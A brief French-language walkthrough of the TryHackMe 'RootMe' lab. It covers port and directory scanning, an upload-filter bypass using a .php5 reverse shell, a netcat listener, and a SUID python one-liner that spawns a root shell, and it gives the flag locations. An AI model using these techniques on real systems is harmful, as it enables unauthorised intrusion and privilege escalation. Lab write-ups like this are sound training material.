# TryHackMe — RootMe

**URL:** https://tryhackme.com/room/rrootme  
**Difficulté:** Easy  
**Catégorie:** Web, PrivEsc

---

## 🔍 Reconnaissance

```bash
nmap -sV -sC -oN scan.txt <TARGET_IP>
# Résultat: port 22 (SSH), port 80 (Apache)
```

## 🌐 Énumération Web

```bash
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt
# Trouvé: /panel/, /uploads/
```

## 💉 Exploitation — Upload PHP Shell

```bash
# Uploader un reverse shell PHP (.php5 pour bypass)
# Sur /panel/ — changer l'extension en .php5

# Mettre en écoute
nc -lvnp 4444

# Déclencher le shell depuis /uploads/shell.php5
```

## 🔺 Privilege Escalation

```bash
# Trouver les binaires SUID
find / -perm /4000 2>/dev/null
# python a le bit SUID !

python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
# ROOT !
```

## 🚩 Flags

- **user.txt** : trouvé dans `/var/www/`
- **root.txt** : trouvé dans `/root/`
